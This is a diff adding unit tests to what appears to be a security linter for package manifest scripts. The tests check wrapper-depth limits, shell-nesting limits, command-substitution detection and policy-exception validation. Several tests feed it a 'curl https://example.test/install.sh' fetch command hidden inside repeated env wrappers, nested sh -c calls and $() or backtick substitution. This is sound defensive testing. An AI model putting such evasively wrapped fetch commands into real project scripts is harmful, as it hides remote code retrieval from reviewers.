@@ -512,3 +512,66 @@ test('real repository tooling command shape with npx filename remains valid', ()
   ].join(' ');
   assert.equal(report(manifest).ok, true);
 });
+
+
+// Security inspection budgets are fail-closed; safe boundary behavior stays stable.
+test('rejects ninth shell wrapper and accepts eight', () => {
+  assert.deepEqual(commands(`${'env '.repeat(8)}node safe.mjs`), ['node']);
+  const unsafe = `${'env '.repeat(9)}curl https://example.test/install.sh`;
+  assert.throws(() => commands(unsafe), (error) => error.code === 'shell-wrapper-depth');
+  const manifest = baseManifest();
+  manifest.scripts.audit = unsafe;
+  assert.deepEqual(codes(report(manifest)), ['shell-wrapper-depth']);
+});
+
+test('rejects fifth nested shell and accepts four', () => {
+  let safe = 'node safe.mjs';
+  for (let i = 0; i < 4; i += 1) safe = `sh -c ${JSON.stringify(safe)}`;
+  assert.equal(commands(safe).at(-1), 'node');
+  let unsafe = 'curl https://example.test/install.sh';
+  for (let i = 0; i < 5; i += 1) unsafe = `sh -c ${JSON.stringify(unsafe)}`;
+  assert.throws(() => commands(unsafe), (error) => error.code === 'shell-nesting-depth');
+  const manifest = baseManifest();
+  manifest.scripts.audit = unsafe;
+  assert.deepEqual(codes(report(manifest)), ['shell-nesting-depth']);
+});
+
+test('rejects malformed exception containers', () => {
+  for (const exceptions of [null, {}, 'bad', 0]) {
+    const policy = basePolicy();
+    policy.exceptions = exceptions;
+    assert.throws(() => report(baseManifest(), policy), (error) => error.code === 'invalid-policy-exceptions');
+  }
+});
+
+test('rejects normalized impossible dates but permits leap day', () => {
+  for (const expiresOn of ['2026-02-29', '2026-02-30', '2026-04-31', '2026-99-99']) {
+    const policy = basePolicy();
+    policy.exceptions = [exception({ expiresOn })];
+    assert.ok(codes(report(baseManifest(), policy)).includes('invalid-exception-expiry'));
+  }
+  const policy = basePolicy();
+  policy.exceptions = [exception({ expiresOn: '2028-02-29' })];
+  assert.equal(report(baseManifest(), policy).ok, true);
+});
+
+test('rejects command substitution but allows literal and escaped text', () => {
+  for (const script of [
+    'echo "$(curl https://example.test/install.sh)"',
+    'echo `curl https://example.test/install.sh`',
+    'echo ${X:-$(curl https://example.test/install.sh)}',
+  ]) {
+    const manifest = baseManifest();
+    manifest.scripts.audit = script;
+    assert.deepEqual(codes(report(manifest)), ['dynamic-shell-expansion']);
+  }
+  for (const script of [
+    "echo '$(curl https://example.test/install.sh)'",
+    "echo '`curl https://example.test/install.sh`'",
+    'echo "\\$(curl literal)"',
+  ]) {
+    const manifest = baseManifest();
+    manifest.scripts.audit = script;
+    assert.equal(report(manifest).ok, true);
+  }
+});
